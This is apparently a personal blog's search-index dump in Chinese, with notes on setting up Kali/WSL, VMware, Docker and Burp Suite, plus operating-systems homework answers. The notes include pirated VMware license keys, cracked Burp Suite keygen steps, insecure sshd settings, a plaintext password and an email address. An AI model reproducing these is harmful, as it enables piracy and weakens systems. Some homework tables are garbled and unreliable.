(portswigger.","title":"DVWA靶场"},{"content":"","date":"2022-09-03","permalink":"/tags/git/","section":"Tags","summary":"","title":"git"},{"content":"","date":"2022-09-03","permalink":"/tags/wsl/","section":"Tags","summary":"","title":"wsl"},{"content":"git安装与配置\u003e git安装与配置 # git下载\n配置账号信息\n# git config --global user.name \u0026#34;kaneki_my\u0026#34; # git config --global user.email \u0026#34;2795188612@qq.com\u0026#34; # ssh-keygen -t rsa -C \u0026#34;2795188612@qq.com\u0026#34; 到git仓库，添加秘钥\n查看密钥存放路径\n​\t将.pub 的内容复制到github上\nGitHub上的git文档 git-tips/README.md at master · kwshare/git-tips (github.com)\n注意本地仓库和远程仓库位置的设置\nWin-KeX kali-WSL\u003e Win-KeX kali-WSL # Win-KeX | Kali Linux Documentation\n图形界面启动命令 ​\tkex --win -s\n​\tkex --sl -s\n​\tkex --esm --ip -s 远程桌面连接 password:kali\n修改root密码\nsudo passwd root\npassword:root\n一些小问题\u003e 一些小问题 # 点击图标打不开wireshark，但是命令行可以\n使用命令：sudo wireshark\n如何使得普通用户能够启动wireshark?\n将dumpcap的用户组更改为 wireshark\nsudo chgrp wireshark /usr/bin/dumpcap\n设置其他用户也具有与root一样的权限来执行dumpcap\nsudo chmod 4755 /usr/bin/dumpcap\n将自身加入到wireshark组中,笔者的用户名为Jello,因此命令如下:\nsudo gpasswd -a Jello wireshark\n配置WSL和宿主机互连，以及代理设置\n修改防火墙规则（每次使用都要运行）\nNew-NetFirewallRule -DisplayName \u0026quot;WSL\u0026quot; -Direction Inbound -InterfaceAlias \u0026quot;vEthernet (WSL)\u0026quot; -Action Allow\nname :{a64653d0-836e-4b5f-b6f0-dc1d058edca7}\n然后会在Windows的防火墙高级设置的入站规则里会看到一条名为WSL的新规则\nvim ~/.local_profile\nexport windows_host=`cat /etc/resolv.conf|grep nameserver|awk \u0026#39;{print $2}\u0026#39;` export ALL_PROXY=socks5://$windows_host:8888 export HTTP_PROXY=$ALL_PROXY export http_proxy=$ALL_PROXY export HTTPS_PROXY=$ALL_PROXY export https_proxy=$ALL_PROXY if [ \u0026#34;`git config --global --get proxy.https`\u0026#34; != \u0026#34;socks5://$windows_host:8888\u0026#34; ]; then git config --global proxy.https socks5://$windows_host:8888 fi 在powershell上固定kali终端\n点击设置 \u0026raquo; 左下角打开json文件 \u0026raquo; 进行编辑 { \u0026#34;commandline\u0026#34;: \u0026#34;wsl -d kali-linux kex --esm --wtstart -s\u0026#34;, \u0026#34;guid\u0026#34;: \u0026#34;{a64653d0-836e-4b5f-b6f0-dc1d058edca7}\u0026#34;, \u0026#34;hidden\u0026#34;: false, \u0026#34;icon\u0026#34;: \u0026#34;file:///C:/Users/27951/kali-menu.png\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;Win-KeX\u0026#34;, \u0026#34;startingDirectory\u0026#34;: \u0026#34;//wsl$/kali-linux/home/kali\u0026#34; }, { \u0026#34;commandline\u0026#34;: \u0026#34;wsl ~\u0026#34;, \u0026#34;guid\u0026#34;: \u0026#34;{a64653d0-836e-4b5f-b6f0-dc1d058edca8}\u0026#34;, \u0026#34;hidden\u0026#34;: false, \u0026#34;name\u0026#34;: \u0026#34;kali\u0026#34;, \u0026#34;startingDirectory\u0026#34;: \u0026#34;%USERPROFILE%\u0026#34; } } kali虚拟机的安装和配置\u003e kali虚拟机的安装和配置 # 安装VMware\n阿里云盘分享\nVMware激活密钥（通用批量永久激活许可）\n16：ZF3R0-FHED2-M80TY-8QYGC-NPKYF\n15：FC7D0-D1YDL-M8DXZ-CYPZE-P2AY6\n12：ZC3TK-63GE6-481JY-WWW5T-Z7ATA\n10：1Z0G9-67285-FZG78-ZL3Q2-234JG\n下载kali镜像\n官网（解压即用）：https://kali.download/virtual-images/kali-2022.2/kali-linux-2022.2-vmware-amd64.7z\n清华：https://mirrors.tuna.tsinghua.edu.cn/kali-images/kali-2022.2/kali-linux-2022.2-installer-amd64.iso\n更改分辨率（字太小了）\nsettings -\u0026gt; display\n换源\u003e 换源 # 备份原先镜像源 sudo cp /etc/apt/sources.list /etc/apt/sources.list.backup\n一键更换（更换成功的话后续操作就不需要了）\nsudo sed -i \u0026quot;s@http://http.kali.org@https://mirrors.tuna.tsinghua.edu.cn@g\u0026quot; /etc/apt/sources.list\n输入sudo vim /etc/apt/sources.list 命令进入源地址文件\n按i进入插入模式\n选择以下任何一个源，复制\ndeb http://http.kali.org/kali kali-rolling main non-free contrib deb-src http://http.kali.org/kali kali-rolling main non-free contrib #tsinghua 清华 deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free deb-src http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free #aliyun 阿里云 deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib #ustc 中科大 deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib #浙大源 deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free 更新前把系统自带的更新源注释或者删除掉\nEsc退出插入模式\n输入:wq保存退出\n最后分开输入sudo apt-get update和sudo apt-get upgrade两个命令，更新软件和升级\n或者apt-get update \u0026amp;\u0026amp; apt-get upgrade \u0026amp;\u0026amp; apt-get dist-upgrade\n换语言\u003e 换语言 # dpkg-reconfigure locales 更换\n找到en_US.UTF-8 UTF-8选项，按空格键将其进行取消\n找到[ ]zh_CN.GBK_GBK 和[ ] zh-CN.UTF-8.UTF-8两个选项，使用空格将[ ]zh_CN.GBK_GBK 和[ ] zh-CN.UTF-8.UTF-8其两项勾选上\nreboot 重启\n将标准文件夹更新到当前语言吗？ 保留旧的名称\n打开ssh\u003e 打开ssh # 测试是否打开了ssh\nssh localhost 配置ssh\n打开配置文件vim /etc/ssh/sshd_config\n用于学习用途可以按以下配置\nPermitRootLogin yes # 是否允许root用户登录，实际工作需要设置为no PubkeyAuthentication yes # 是否开启基于公钥认证机制，有了公钥就可以免密登陆 PasswordAuthentication yes # 是否使用密码验证，如果使用密钥对验证可以关了它 PermitEmptyPasswords yes # 是否允许空密码，如果上面的那项是yes，这里最好设置no，但平时测试为了方便就设置了yes 重启服务\nservice ssh restart systemctl enable ssh xshell连接测试\nifconfig #查看IP地址 git配置（参考第一部分）\n安装docker\napt-get install docker docker-compose\n启动docker服务\nservice docker start\n配置加速器\nvim /etc/docker/daemon.json #写入内容 { \u0026#34;registry-mirrors\u0026#34;: [\u0026#34;https://xxx.mirror.aliyuncs.com\u0026#34;] } # https://cniirv3a.mirror.aliyuncs.com #重启 systemctl restart docker #设置docker开机自启 systemctl enable docker 其他公开Docker镜像加速源（无需注册）\nhttps://docker.mirrors.ustc.edu.cn\t#中科大\nhttp://hub-mirror.c.163.com/\t#网易\n虚拟机内软件\u003e 虚拟机内软件 # hackbar2.1.3 （火狐插件）\n链接：https://pan.baidu.com/s/1evk5Vkxruh22bNEl_4qMVg?pwd=zyeu 提取码：zyeu\nBurp_Suite_Pro_v1.7.37\n常用软件的安装与破解\u003e 常用软件的安装与破解 # VM\u003e VM # 安装VMware（见kali虚拟机的安装）\ntypora安装与破解\u003e typora安装与破解 # 「Typora1.3.8中文直装版.exe」https://www.aliyundrive.com/s/3ZTCfrrNJ27\n图床配置 Burp_Suite_Pro_v1.7.37\u003e Burp_Suite_Pro_v1.7.37 # 下载jdk8，选择Linux x86 Compressed Archive\n下载并解压缩\n#此处wget的非官方文件 wget https://www.iculture.cc/software/tools/jdk-8u191-linux-x64.tar.gz tar -xzvf jdk-8u191-linux-x64.tar.gz sudo cp -r jdk1.8.0_191 /opt cd /opt/jdk1.8.0_191 设置环境变量\n编辑启动文件 有的是bashrc 有的是zshrc\nvim ~/.zshrc 在最下方添加\n目录要跟自己下载的jdk版本对应，不能盲目照搬\n#install JAVA JDK export JAVA_HOME=/opt/jdk1.8.0_191 export CLASSPATH=.:${JAVA_HOME}/lib export PATH=${JAVA_HOME}/bin:$PATH 使其立即生效\nsource ~/.zshrc 安装\n# sudo update-alternatives --install /usr/bin/java java /opt/jdk1.8.0_191/bin/java 1 # sudo update-alternatives --install /usr/bin/javac javac /opt/jdk1.8.0_191/bin/javac 1 # sudo update-alternatives --set java /opt/jdk1.8.0_191/bin/java # sudo update-alternatives --set javac /opt/jdk1.8.0_191/bin/javac 验证版本\njava -version 安装burpsuite专业版\n下载\n命令行wget https://www.iculture.cc/software/tools/Burp_Suite_Pro_v1.7.37_Loader_Keygen.zip\n若失效\n「Burp_Suite_Pro_v1.7.37_Loader_Keygen」等文件 https://www.aliyundrive.com/s/3cNMHv1G4h5 点击链接保存，或者复制本段内容，打开「阿里云盘」APP ，无需下载极速在线查看，视频原画倍速播放。\n解压缩\nunzip Burp_Suite_Pro_v1.7.37_Loader_Keygen.zip 将文件拷贝到/usr/bin目录中\nsudo cp -r burp-loader-keygen.jar burpsuite_pro_v1.7.37.jar /usr/bin 激活\n进入/usr/bin\ncd /usr/bin 启动激活程序(jar程序启动通用命令)\njava -jar burp-loader-keygen.jar 点击run\n点击next\n点击Manual activation完成手动激活\n设置快捷方式\n在/usr/bin中删除burpsuite社区版\ncd /usr/bin sudo rm -rf burpsuite 新建burpsuite\nvi burpsuite 设置如下内容\n#!/bin/sh java -Xbootclasspath/p:/usr/bin/burp-loader-keygen.jar -jar /usr/bin/burpsuite_pro_v1.7.37.jar 增加权限\nchmod +x burpsuite 进入/usr/share/applications\ncd /usr/share/applications 编辑burpsuite快捷方式\nvi kali-burpsuite.desktop 找到Exec=sh -c一行\nExec=sh -c \u0026#34;java -jar /usr/bin/burpsuite\u0026#34; 修改为\nExec=sh -c \u0026#34;/usr/bin/burpsuite\u0026#34; 修改效果如图，请注意这里引号是英文的，别手抖打错了\ndocker desktop\u003e docker desktop # 配置镜像\n获取自己的镜像地址\n容器镜像服务 (aliyun.com)\n写入docker-setting\n测试是否成功\ndocker info 以特权程序创建和运行容器，便于使用服务\ndocker run -d --name centos --privileged=true centos:centos7 /usr/sbin/init docker exec -it centos /bin/bash docker centos\u003e docker centos # docker pull centos:latest Linux中必备常用支持库的安装\n在CentOS安装软件的时候，可能缺少一部分支持库，而报错。这里首先安装系统常用的支持库。那么在安装的时候就会减少很多的错误的出现。\n# yum install -y epel-release # yum install -y gcc gdb strace gcc-c++ autoconf libjpeg libjpeg-devel libpng libpng-devel freetype freetype-devel libxml2 libxml2-devel zlib zlib-devel glibc glibc-devel glib2 glib2-devel bzip2 bzip2-devel ncurses ncurses-devel curl curl-devel e2fsprogs patch e2fsprogs-devel krb5-devel libidn libidn-devel openldap-devel nss_ldap openldap-clients openldap-servers libevent-devel libevent uuid-devel uuid mysql-devel 安装vim\nyum -y install vim* 配置vim\nvim /etc/vimrc\n找个位置添加以下代码\nset su set showmode set ruler set autoindent syntax on :wq 保存并退出 卸载\nyum remove -y vim*\n安装ifconfig 、firewall、nmcli 、nmtui\nyum install net-tools.x86_64 yum install firewalld firewall-config yum install NetworkManager yum install NetworkManager-tui 防火墙的关闭\nsystemctl stop firewalld systemctl disable firewalld.service WSL捣腾日记\u003e WSL捣腾日记 # bug真的多，重试第三次，再不行就换Ubuntu\n卸载子系统\u003e 卸载子系统 # 注销\nwsl --unregister kali-linux\n下载kali-linux\u003e 下载kali-linux # 点击打开，设置username和password\n可以直接设置root密码\nsudo -i\npasswd root\n重复输入两次密码：root\n根据kali官网文档 Win-KeX | Kali Linux Documentation\n下载桌面版\nsudo apt update\nsudo apt install -y kali-win-kex\n第一次bug\nping命令有问题\n第二次bug\n在安装了完整版kali后，出现浏览器打不开的情况\n第三次重装\nping依旧有问题\n第四次\n商店安装\n设置初始username和password\n更新源\n测试，kali可以ping\n安装桌面版\n测试，kali不可以ping但是root可以，并且浏览器可以打开\n解决普通用户不能ping但是root可以的问题\n原因分析：\nping命令在运行中采用了ICMP协议，需要发送ICMP报文。但是只有root用户才能建立ICMP报文。而正常情况下，ping命令的权限应为-rwsr-xr-x，即带有suid的文件，一旦该权限被修改，则普通用户无法正常使用该命令。\n解决方案：\n使用root用户执行\nchmod u+s /bin/ping\n换源\n编辑 /etc/apt/sources.list 文件\ndeb [arch=amd64] https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main non-free-contrib # deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main non-free-contrib sudo apt-get update \u0026amp;\u0026amp; apt-get upgrade \u0026amp;\u0026amp; apt-get dist-upgrade\n安装完整版kali\nsudo apt install -y kali-linux-large\n安装LxRunOffline\u003e 安装LxRunOffline # 可以迁移WSL的安装目录\n参考教程\nLxRunOffline使用手册 | 0opsdc (oopsdc.com)\n发布 ·DDoSolitary/LxRunOffline (github.com)\n下载 LxRunOffline-v3.5.0-msvc.zip\n解压文件到C:\\Windows\\System32\n命令行输入lxrunoffline，检测是否安装成功\n遇到了一个bug，删除了注册表，然后貌似一个问题解决了，又出现了新的问题\n问题链接\n[ ERROR] Couldn\u0026rsquo;t get the value \u0026ldquo;DistributionName\u0026rdquo; of the registry key \u0026ldquo;Software\\Microsoft\\Windows\\CurrentVersion\\Lxss\\TryStoreWSL\u0026rdquo;. · Issue #195 · DDoSolitary/LxRunOffline (github.com)\n使用离线包安装ubuntu\n如果是从微软官方下载WSL离线包，文件后缀为.appx，我们手动改为.zip，然后解压，install.tar.gz就是我们后续使用的安装文件。\nlxrunoffline i -s -n \u0026lt;WSL名称\u0026gt; -d \u0026lt;安装路径\u0026gt; -f \u0026lt;安装包路径\u0026gt;.tar.gz\nlxrunoffline i -s -n ubuntu-linux -d E://WSL -f E:\\Users\\27951\\Downloads\\Compressed\\CanonicalGroupLimited.UbuntuonWindows_2004.2021.825.0\\Ubuntu_2004.2021.825.0_ARM64\\install.tar.gz\n-s 参数表示在桌面创建WSL快捷图标\n不出意外，就出意外了\n报错\n我猜这个是因为注册表的问题\n解决不了，弃用\n安装Windows Subsystem for Linux\u003e 安装Windows Subsystem for Linux # 更新wsl\nwsl.exe \u0026ndash;update\n商店Ubuntu20.04\u003e 商店Ubuntu20.04 # 设置账号密码\n换源\nsudo sed -i \u0026#34;s@http://.*archive.ubuntu.com@https://mirrors.tuna.tsinghua.edu.cn@g\u0026#34; /etc/apt/sources.list sudo sed -i \u0026#34;s@http://.*security.ubuntu.com@https://mirrors.tuna.tsinghua.edu.cn@g\u0026#34; /etc/apt/sources.list 更新源\napt update\n安装图形界面\nsudo apt install -y xfce4 xrdp\n修改xrdp默认端口\nsudo vim /etc/xrdp/xrdp.ini # port=3390 为当前用户指定登录session类型\n注意这一步很重要,如果不设置的话会导致后面远程桌面连接上闪退\nsudo vim ~/.xsession # 写入下面内容(就一行) xfce4-session 启动xrdp\u003e 启动xrdp # 由于WSL2里面不能用systemd,所以需要手动启动\nsudo /etc/init.d/xrdp start #正常的话，返回如下： * Starting Remote Desktop Protocol server 远程访问\n​ 在Windows系统中运行mstsc命令打开远程桌面连接,地址输入localhost:3390\n注意这里的端口号应当与上面修改配置中一致\n下载网络工具\nsudo apt install net-tools\n这个ping命令没有问题\n但是也打不开浏览器，奇奇怪怪\n卸载了\n局域网科学网络共享\u003e 局域网科学网络共享 # 把电脑的ip改为固定的ip\nclash打开局域网模式\n给手机配置代理\n","date":"2022-09-03","permalink":"/docs/%E9%87%8D%E8%A3%85%E7%94%B5%E8%84%91/","section":"Docs","summary":"git安装与配置\u003e git安装与配置 # git下载\n配置账号信息\n# git config --global user.name \u0026#34;kaneki_my\u0026#34; # git config --global user.email \u0026#34;2795188612@qq.com\u0026#34; # ssh-keygen -t rsa -C \u0026#34;2795188612@qq.com\u0026#34; 到git仓库，添加秘钥\n查看密钥存放路径\n​\t将.pub 的内容复制到github上\nGitHub上的git文档 git-tips/README.md at master · kwshare/git-tips (github.","title":"重装电脑"},{"content":"开启远程桌面\u003e 开启远程桌面 # update\napt-get update \u0026amp;\u0026amp; apt-get upgrade \u0026amp;\u0026amp; apt-get dist-upgrade\n添加新的管理员\nsudo -i adduser rdpuser password 2y$}KzE2 安装Ubuntu图形界面\nsudo apt install ubuntu-desktop\n安装和配置rdp服务器\nsudo apt install xrdp sudo systemctl status xrdp sudo vim /etc/xrdp/xrdp.ini 修改 : port=tcp://:3389 在防火墙上打开rdp端口\nsudo systemctl restart xrdp sudo ufw allow 3389 ","date":"2022-01-11","permalink":"/posts/%E5%BC%80%E5%90%AF%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/","section":"文章列表","summary":"开启远程桌面\u003e 开启远程桌面 # update\napt-get update \u0026amp;\u0026amp; apt-get upgrade \u0026amp;\u0026amp; apt-get dist-upgrade\n添加新的管理员\nsudo -i adduser rdpuser password 2y$}KzE2 安装Ubuntu图形界面\nsudo apt install ubuntu-desktop\n安装和配置rdp服务器\nsudo apt install xrdp sudo systemctl status xrdp sudo vim /etc/xrdp/xrdp.","title":"开启远程桌面"},{"content":"","date":"2022-01-07","permalink":"/tags/java/","section":"Tags","summary":"","title":"Java"},{"content":"","date":"2022-01-07","permalink":"/tags/jdbc/","section":"Tags","summary":"","title":"jdbc"},{"content":"","date":"2022-01-07","permalink":"/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/","section":"Tags","summary":"","title":"操作系统"},{"content":"第一章 习题\u003e 第一章 习题 # 1. 判断以下命题是否正确，并说明理由。\u003e 1. 判断以下命题是否正确，并说明理由。 # 设计操作系统的主要目标是什么？\n方便性：使计算机更易于用户使用。 有效性：以有效的方式管理计算机系统的资源，合理地组织计算机的工作流程， 以防止对计算机资源的不当或错误使用。这是操作系统可用的关键因素。 可扩展性：为用户的的开发搭建一个平台，允许修改、并引进新的功能。 操作系统为计算机上所有软件的性能提高提供了平台，另外，操作系统提供了一系列功能用以支持用户程序的运行。 操作系统的基本功能是什么?\n操作系统是用户和计算机硬件之间的接口。 操作系统是计算机系统资源的管理者。 操作系统用作扩充机器，使得裸机功能更强、更方便使用。 多道批处理系统形成和发展的主要动力是什么？\n计算机体系的不断发展，需要不断提高计算机资源的利用率和系统吞吐量的需要。\n推动分时操作系统形成和发展的主要动力是什么？\n为了满足用户对人机交互的需求，出现了分时系统。\n操作系统的结构大致可分为哪几类？UNIX 的结构有什么特点？\n三类：整体、分层、微内核\nUNIX是分层结构\n优点 增加了系统的可读性和可适应性，简化了系统的设计和实现。 易于调试、修改、扩充、维护和保证正确性。 缺点 操作系统的效率不高。 层的定义较为困难。 第二章 习题\u003e 第二章 习题 # 1. 判断以下命题是否正确，并说明理由。\u003e 1. 判断以下命题是否正确，并说明理由。 # 多道程序设计的目的是为了提高程序员编制程序的效率。 错。多道程序是为了充分发挥CPU和计算机系统部件并进行工作的能力，从而提高CPU的利用率。\n采用多道程序设计，能充分发挥处理机的使用效率，缩短每个进程的周转时间。 错。周转时间是指从作业提交到作业完成之间的时间间隔，有一些短进程可能由于进程调度方式，导致其等待时间增加，相比于单独处理它，短进程的周转时间增加了。\n因此只能说是缩短平均周转时间，而不是每个进程的周转时间。\n操作系统的设计必须要保证进程具有可再现性。 错。可再现性是指：程序只要初始条件相同，运行结果一定相同，即运行结果与执行速度无关。单道程序的顺序执行必须保证可再现性，但是在多道程序并发执行的条件下，可再现性无法保证，取而代之的是不确定性，也许程序的运行结果相同，但是执行速度是不确定的。\n进程控制块是进程存在的唯一标识。 对。PCB提供了几乎所有管理进程的所需信息，标识了进程的存亡。\n只有在某些条件成立时才可能发生进程调度。\n对。进程调度是指进程由活跃就绪态转换为运行态的过程。在等待的事件得到满足或者处于静止就绪态并且内存空闲已经有大片空闲时，会由其他状态转为活跃就绪态，进而发生进程调度，获得处理机，进入运行态。\n中级调度即从就绪队列中选择一个进程，分配处理机使其运行。\n错。中级调度负责静止态和活跃态的转换，分配处理机是进程调度（低级调度）所需要负责的事\n2. 单项选择题\u003e 2. 单项选择题 # 在单处理机的多进程系统中，进程什么时候占用处理机和能占用多长时间取决于（ ）。\nA、进程相应的程序段的长度 B、进程总共需要运行时间多少\nC、进程自身和进程调度策略 D、进程完成什么功能\n进程自身决定（ ）。\nA、从执行状态到阻塞状态 B、从执行状态到就绪状态\nC、从就绪状态到执行状态 D、从阻塞状态到就绪状态\n下列选项中，导致创建新进程的操作是：（ ）。\n1、用户登录成功\n2、设备分配\n3、启动程序执行\nA、仅 1 和 2 B、仅 2 和 3\nC、仅 1 和 3 D、1、2、3\n在支持多线程的系统中，进程 P 创建的若干个线程不能共享的是（ ）。\nA、进程 P 的代码段\tB、进程 P 中打开的文件\nC、进程 P 的全局变量\tD、进程 P 中某线程的栈指针\n下列选项中，降低进程优先权级的合理时机是（ ）。 A、进程的时间片用完 B、进程刚完成 I/O，进入就绪队列\nC、进程长期处于就绪队列 D、进程从就绪态转为执行态\n设有 3 个作业 J1、J2、J3，其运行时间分别是 2、5、3 小时，假定它们同时到达，并 在同一台处理器上以单道方式运行，则平均周转时间最小的执行序列是（ ）。\nA、J1、J2、J3 B、J3、J2、J1\tC、J2、J1、J3 D、J1、J3、J2\n3. 填空题\u003e 3. 填空题 # 建立多进程的主要目的是提高 CPU 的利用率。 在多进程多线程系统中，资源分给 进程，CPU 按 线程 调度。 UNIX 进程控制块由 proc 和 user 构成。 UNIX 进程的上下文由 用户级 、 寄存器 和 系统级 三个层次的内容构成。 UNIX 进程可在 用户态 态和 核心态 态下执行。至于具体处于何种态是由 PCB 中相应位决定的。 决定 UNIX 进程状态的 proc 数据项有：p_stat 、p_flag 和 p_pri 。 4. 什么是多道程序设计，其主要优点是什么？\u003e 4. 什么是多道程序设计，其主要优点是什么？ # 多道程序设计：指允许让多个计算问题同时装入一个计算机系统的主存储器，并允许它们共享资源、并发执行的程序设计技术。\n优点：\n并发：提高CPU和外围设备、外围设备和外围设备间的并行工作能力 资源共享：提高CPU及其他各种资源的利用率。 5. 程序并发执行时失去程序的封闭性的主要原因是什么？\u003e 5. 程序并发执行时失去程序的封闭性的主要原因是什么？ # 并发执行的程序不再是独占资源，而是资源共享，而这些资源的状态受多个程序影响，进而程序间产生了某种联系，因此失去了封闭性，同时也失去了可再现性\n6. 何为进程？系统为了控制进程的运行，都要保护什么？\u003e 6. 何为进程？系统为了控制进程的运行，都要保护什么？ # 进程是一个程序在某个数据集上的一次执行；\n保护进程的PCB（PCB的内容）\n7. 比较作业和进程的异同。\u003e 7. 比较作业和进程的异同。 # 作业与进程之间的区别\n本质\n作业就是用户要求计算机完成的一项任务；\n进程是系统为了完成作业而设置的动态执行体。\n资源\n作业中的作业说明书事先说好了资源的分配关系，这是静态的；\n进程是操作系统分配资源的基本单位，这是动态的。\n作业和进程的对应关系\n一个进程对应一个作业\n一个作业需要多个进程\n8. 比较进程和程序的异同。\u003e 8. 比较进程和程序的异同。 # 考虑动态性 进程是程序的一次执行过程，进程是一个动态概念；\n而程序是完成某个特定功能的指令的有序序列，即程序是一个静态概念。\n程序是代码的集合，而进程是程序的执行。\n程序可以作为一种软件资源长期保存，可以被复制，可以在不同的计算机上运行；\n而进程，是有生命周期的，它动态地被创建，并被调度执行后消亡。\n考虑并发性 进程具有并发特征，而程序没有。由于一个进程可以与其他进程并发执行，即进程具有并发性；而程序并不反映执行过程，所以不具有并发特征。\n考虑资源 进程是系统进行资源分配和调度的一个独立单位，即资源分配是以进程为单位的，而不是以程序为单位的。\n考虑结构 程序的组成是代码，而进程实体的组成包括：程序、数据和 PCB。\n考虑生成性 进程可以生成其他进程，而程序则无法生成新的程序。\n考虑对应关系 一个程序多次执行可以对应多个进程；通过调用关系，一个进程也可以包括多个程序。\n9. 在创建和撤销一个进程时所要完成的主要工作是什么？\u003e 9. 在创建和撤销一个进程时所要完成的主要工作是什么？ # 在创建和撤销一个进程时所要完成的主要工作是什么？\n进程创建： 申请空闲PCB 分配资源 初始化PCB的信息 将新进程插入就绪队列 撤销进程： 修改该进程的状态，设置重新调度标志 检测子孙进程，递归终止 递归归还资源 递归释放PCB 若重新调度标志位真，调用进程调度程序，重新分配处理机 当进程 A 由于所分配的时间片到，由执行状态转入就绪状态；而进程 B 被调度程序选中由就绪状态转为执行状态时，系统所要做的主要工作是什么？\n将A的状态改为就绪态，并剥夺其CPU，将其放入就绪队列；\n将B的状态改为执行态，将其移出就绪队列，并分配CPU。\n11. 处理机调度分为几级？每一级调度的主要任务是什么？\u003e 11. 处理机调度分为几级？每一级调度的主要任务是什么？ # 四级\n作业（高级）调度\n按一定的原则，从输入井中选择一个作业（或一批作业），将其 调入内存、分配必要的资源，并为其建立相应的进程，以使该（批）作业具有竞争 CPU 的 资格；当然，作业执行完毕时，作业调度还需负责回收系统资源。\n交换（中程）调度\n按照一定的原则，将处于外存对换区中具备运行条件的就绪进程调入内存；或者，将处于内存中阻塞状态或者就绪状态的进程换出到外存交换区。\n进程（低级）调度\n是按照一定的策略，选取一个处于活跃就绪状态的进 程占用 CPU 并进行进程的上下文切换。\n线程调度\n对于内核级线程调度，其实质与调度的策略都与进程调度十分类似，因此也有人并不对进程调度与内核级线程调度进行区分，而把内核级线程调度也称为短程调度或低级调度。\n13. 列出 3 个引起进程阻塞和唤醒的事件，并写出唤醒原语的执行步骤。\u003e 13. 列出 3 个引起进程阻塞和唤醒的事件，并写出唤醒原语的执行步骤。 # (1) 向系统请求共享资源失败。 (2) 等待某种操作的完成。 (3) 新数据尚未到达。 (4) 等待新任务的到达。\n操作步骤\n找出标识\n从阻塞队列移出\n设置为就绪态\n插入就绪队列\n考虑被唤醒进程和当前运行进程的优先级\n若被唤醒进程优先级更高则需要设置调度标志，并转进程调度程序。\n19. 若系统中运行的主要是这 2 类进程，采用什么调度算法更有利于资源的利用率？为什么？\u003e 19. 若系统中运行的主要是这 2 类进程，采用什么调度算法更有利于资源的利用率？为什么？ # 将“I/O 为主”的进程定义为：当此类进程单独运行时，用于 I/O 处理的时间远远多于 处理机的处理时间。将“计算为主”的进程定义为：当此类进程单独运行时，处理机的处理时间远远多于处理的时间。若系统中运行的主要是这 2 类进程，采用什么调度算法更有利于资源的利用率？为什么？\n以IO为主的进程可以理解为短进程，因为每次IO处理完之后都会重新排队\n以计算为主的进程可以理解为长进程。\n多级反馈队列可以有效兼顾长短进程\n20. 采用“抢先方式的最高优先级”调度算法，回答以下问题：\u003e 20. 采用“抢先方式的最高优先级”调度算法，回答以下问题： # 某多道程序设计系统中配有一台处理器 CPU 和两台输入输出设备 I/O1 和 I/O2，现有优先级由高到低的三个进程 P1、P2、P3 同时存在，它们使用资源的先后次序和占用时间分别是： 进程 P1：I/O2（30ms），CPU（10ms），I/O1（30ms），CPU（10ms），I/O2（10ms）； 进程 P2：I/O1（20ms），CPU（20ms），I/O2（40ms）； 进程 P3：CPU（30ms），I/O1（20ms）。 若进程调度采用“抢先方式的最高优先级”调度算法，且忽略调度等所需要的时间， 回答以下问题：\n进程 P1、P2、P3 从开始到完成所用的时间分别是多少？（用坐标画出进程 P1、 P2、P3 工作过程，其中横坐标表示时间，纵坐标表示 CPU 和 I/O 设备。）\n三个进程从开始到全部结束完成时 CPU 的利用率是多少？I/O 利用率是多少？\n22. 采用最短周期优先调度算法，回答以下问题\u003e 22. 采用最短周期优先调度算法，回答以下问题 # 假定有一组作业（或进程），它们提交时间及要求运行的时间如下表所示（单位为小时， 并以十进制计）\n如果采用最短周期优先调度算法，计算出该组作业的平均周转时间 T=1.725 小时和平均带权周转时间 W=6.875 小时。对吗？为什么？\n作业号 提交时间 运行时间 等待时间 完成时间 周转时间 代权周转时间 1 8:00 2 0 10:00 2 1 3 9:00 0.1 1 10:06 1.1 11 4 9:50 0.2 16/60 10:18 28/60 2.33 2 8:50 0.5 88/60 10:48 108/60 3.6 平均值 0.775 4.4825 23. 求在采用如下算法时进程的平均周转时间和平均带权周转时间。\u003e 23. 求在采用如下算法时进程的平均周转时间和平均带权周转时间。 # 下表列出了五个进程的执行时间和优先数，规定优先数越小优先级越大，在某时刻这五个进程按照 P0、P1、P2、P3、P4 的顺序同时到达，求在采用如下算法时进程的平均周转时间和平均带权周转时间。（调度方式为非抢先方式，且忽略进程调度所花时间。）\n先来先服务调度算法；\n先来先服务 进程名 提交时间 运行时间 等待时间 完成时间 周转时间 代权周转时间 P0 0 20 0 20 20 1 P1 0 15 20 35 35 2.333333333 P2 0 35 35 70 70 2 P3 0 25 70 95 95 3.8 P4 0 40 95 135 135 3.375 平均值 71 2.501666667 最短周期优先调度算法；\n最短周期优先 进程名 提交时间 运行时间 等待时间 完成时间 周转时间 代权周转时间 P0 0 20 0 20 20 1 P1 0 15 20 35 35 2.333333333 P3 0 25 35 60 60 2.4 P2 0 35 60 95 95 2.714285714 P4 0 40 95 135 135 3.375 平均值 69 2.36452381 时间片轮转调度算法（时间片为 5ms）；\n时间片轮转 进程名 提交时间 运行时间 等待时间 完成时间 周转时间 代权周转时间 P0 0 20 80 105 105 1 P1 0 15 40 35 2.333333333 P2 0 35 35 70 70 2 P3 0 25 70 95 95 3.8 P4 0 40 95 135 135 3.375 平均值 71 2.501666667 最高优先级优先调度算法。\n优先级优先 进程名 提交时间 运行时间 等待时间 完成时间 周转时间 代权周转时间 P1 0 15 0 15 15 1 P3 0 25 15 40 40 1.6 P0 0 20 40 60 60 3 P2 0 35 60 95 95 2.714285714 P4 0 40 95 135 135 3.375 平均值 69 2.337857143 24. 计算平均周转时间\u003e 24. 计算平均周转时间 # 下表给出作业 1、2、3、4 的到达时间和运行时间。请分别给出采用非抢先方式最短周期优先调度算法和先来先服务调度算法时作业调度次序，并计算平均周转时间。（时间单位： 小时，以十进制进行计算）\n最短周期优先 作业号 提交时间 运行时间 等待时间 完成时间 周转时间 代权周转时间 1 2:00 2 0 4:00 2 1 3 3:00 